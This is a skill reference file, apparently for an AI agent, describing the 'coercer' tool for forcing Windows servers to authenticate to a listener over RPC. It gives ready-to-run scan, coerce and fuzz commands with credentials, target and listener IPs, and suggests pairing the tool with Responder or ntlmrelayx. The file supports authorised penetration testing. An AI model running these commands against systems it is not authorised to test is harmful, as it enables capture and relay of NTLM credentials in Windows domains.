---
name: coercer
description: Automatically coerce Windows servers to authenticate to an arbitrary machine using various RPC methods. Use when performing NTLM relay attacks, capturing Net-NTLM hashes, or testing for authentication coercion vulnerabilities in Windows environments during penetration testing or red teaming.
---

# coercer

## Overview
A Python tool designed to automate the process of coercing a Windows server to authenticate to a controlled listener. It leverages multiple RPC methods (like MS-RPRN, MS-EFSR, MS-FSRVP, etc.) to force the target to send authentication requests to a specified IP. Category: Exploitation / Sniffing & Spoofing.

## Installation (if not already installed)
Assume coercer is already installed. If you get a "command not found" error:

```bash
sudo apt update && sudo apt install coercer
```

## Common Workflows

### Scan for vulnerabilities without triggering full coercion
Identify which RPC methods are available and vulnerable on the target.
```bash
coercer scan -u "user" -p "password" -d "domain.local" -t 192.168.1.10
```

### Coerce authentication to a listener (e.g., Responder)
Force the target to authenticate to your machine to capture hashes or relay.
```bash
coercer coerce -u "user" -p "password" -d "domain.local" -t 192.168.1.10 -l 192.168.1.50
```

### Fuzz for new or hidden coercion paths
Test every method with a comprehensive list of exploit paths to find non-standard vulnerabilities.
```bash
coercer fuzz -u "user" -p "password" -d "domain.local" -t 192.168.1.10 -l 192.168.1.50
```

## Complete Command Reference

### Global Options
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |
| `-v`, `--verbose` | Verbose mode (default: False) |

### Subcommands

#### scan
Tests known methods with known working paths on all methods and reports when an authentication is received.
```bash
coercer scan [options]
```

#### coerce
Trigger authentications through all known methods with known working paths.
```bash
coercer coerce [options]
```

#### fuzz
Tests every method with a list of exploit paths and reports when an authentication is received.
```bash
coercer fuzz [options]
```

### Subcommand Arguments (Common to scan, coerce, fuzz)

#### Target & Listener
| Flag | Description |
|------|-------------|
| `-t`, `--target` | IP address or hostname of the target machine |
| `-l`, `--listener` | IP address or hostname of the listener machine (where you want the target to connect) |

#### Authentication
| Flag | Description |
|------|-------------|
| `-u`, `--username` | Username for authentication |
| `-p`, `--password` | Password for authentication |
| `-d`, `--domain` | Domain for authentication |
| `--hashes` | NTLM hashes, format `LMHASH:NTHASH` |
| `--no-pass` | Don't ask for password (useful for null sessions) |
| `-k`, `--kerberos` | Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) |
| `--dc-ip` | IP address of the domain controller |

#### Connection & Performance
| Flag | Description |
|------|-------------|
| `--port` | Port to connect to (default: 445) |
| `--threads` | Number of threads to use (default: 10) |
| `--timeout` | Timeout in seconds (default: 10) |
| `--delay` | Delay between requests in seconds |

#### Filtering & Methods
| Flag | Description |
|------|-------------|
| `--method` | Specific RPC method to use (e.g., MS-RPRN, MS-EFSR) |
| `--filter-methods` | List of methods to ignore |
| `--only-methods` | List of methods to use exclusively |

## Notes
- This tool is highly effective when combined with `Responder` or `ntlmrelayx.py`.
- Ensure you have valid credentials or a valid session, as most coercion methods require at least low-level authenticated access.
- Some methods may be patched depending on the Windows version and security updates (e.g., PetitPotam/MS-EFSR mitigations).